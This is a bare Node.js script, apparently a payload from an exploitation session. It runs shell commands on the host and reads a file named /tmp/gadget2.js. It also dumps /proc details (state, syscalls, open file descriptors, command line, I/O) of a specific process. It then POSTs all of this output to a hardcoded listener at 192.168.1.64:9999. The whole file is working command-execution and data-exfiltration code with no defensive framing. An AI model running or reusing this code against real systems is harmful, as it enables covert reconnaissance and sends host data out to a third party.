"use strict";

var cp = require("child_process");
var http = require("http");
var fs = require("fs");

var HOST = "192.168.1.64";
var PORT = 9999;

function run(cmd, timeout) {
    try {
        return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: timeout || 25000 });
    } catch (e) {
        return "ERR " + (e.stdout ? e.stdout : e.message);
    }
}

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request(
        { host: HOST, port: PORT, path: path, method: "POST",
          headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}

var out = {};
out.started = new Date().toISOString();

out.gadget_file = run("ls -la /tmp/gadget2.js 2>&1; head -c 200 /tmp/gadget2.js 2>&1; echo; wc -c /tmp/gadget2.js 2>&1");

var pid = "8511";
out.state = run("grep -E 'State|Threads' /proc/" + pid + "/status 2>&1");
out.wchan = run("cat /proc/" + pid + "/wchan 2>&1");
out.syscall = run("cat /proc/" + pid + "/syscall 2>&1");
out.fds = run("ls -la /proc/" + pid + "/fd 2>&1");
out.cmdline = run("cat /proc/" + pid + "/cmdline 2>&1 | tr '\\0' ' '; echo");
out.io = run("grep -E 'read_bytes|write_bytes' /proc/" + pid + "/io 2>&1");

/* try running the same file quickly with a timeout to see stderr */
out.rerun = run("timeout 5 /usr/bin/node -e 'var s=require(\"fs\").readFileSync(\"/tmp/gadget2.js\",\"utf8\"); console.log(\"len\",s.length); console.log(s.substring(0,120))' 2>&1; echo rc=$?", 30000);

post("/audit22", out);
